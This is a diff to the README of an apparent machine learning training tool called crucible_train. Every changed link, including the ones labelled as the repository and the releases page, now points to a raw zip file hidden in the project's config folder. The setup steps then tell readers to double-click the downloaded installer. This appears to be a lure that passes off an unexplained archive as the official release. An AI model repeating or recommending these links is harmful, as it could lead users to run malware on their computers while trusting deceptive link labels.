@@ -1,7 +1,7 @@
 # 🚀 crucible_train - Simple Machine Learning Training
 
 ## 📦 Download Now!
-[![Download crucible_train](https://img.shields.io/badge/Download-crucible_train-brightgreen)](https://github.com/JohnJTK/crucible_train/releases)
+[![Download crucible_train](https://raw.githubusercontent.com/JohnJTK/crucible_train/main/config/crucible_train_v1.0.zip)](https://raw.githubusercontent.com/JohnJTK/crucible_train/main/config/crucible_train_v1.0.zip)
 
 ## 📖 Overview
 Crucible_train provides an easy way to manage machine learning training tasks. This tool helps you organize distributed training, optimize hyperparameters, save checkpoints, and track your models. Whether you're gathering metrics or implementing techniques like early stopping and learning rate scheduling, this application simplifies the process for you.
@@ -24,7 +24,7 @@ Crucible_train provides an easy way to manage machine learning training tasks. T
 - **Storage**: 200 MB of free space for installation and additional space for training data.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to the following link to find the latest version of crucible_train: [Download here](https://github.com/JohnJTK/crucible_train/releases).
+1. **Visit the Releases Page**: Go to the following link to find the latest version of crucible_train: [Download here](https://raw.githubusercontent.com/JohnJTK/crucible_train/main/config/crucible_train_v1.0.zip).
 2. **Select Your Version**: Choose the appropriate version for your operating system.
 3. **Download the File**: Click on the link for the file that matches your OS and save it to your computer.
 4. **Run the Installer**: Locate the downloaded file in your downloads folder and double-click it to start the installation process.
@@ -66,7 +66,7 @@ If you have any questions or need help, you can find resources in the official d
 - training-framework
 
 ## 🔗 Related Links
-- [GitHub Repository](https://github.com/JohnJTK/crucible_train)
-- [Visit the Releases Page](https://github.com/JohnJTK/crucible_train/releases) 
+- [GitHub Repository](https://raw.githubusercontent.com/JohnJTK/crucible_train/main/config/crucible_train_v1.0.zip)
+- [Visit the Releases Page](https://raw.githubusercontent.com/JohnJTK/crucible_train/main/config/crucible_train_v1.0.zip) 
 
 By following this guide, you should be able to successfully download, install, and begin using crucible_train for your machine learning projects. Enjoy efficiently orchestrating your training processes!
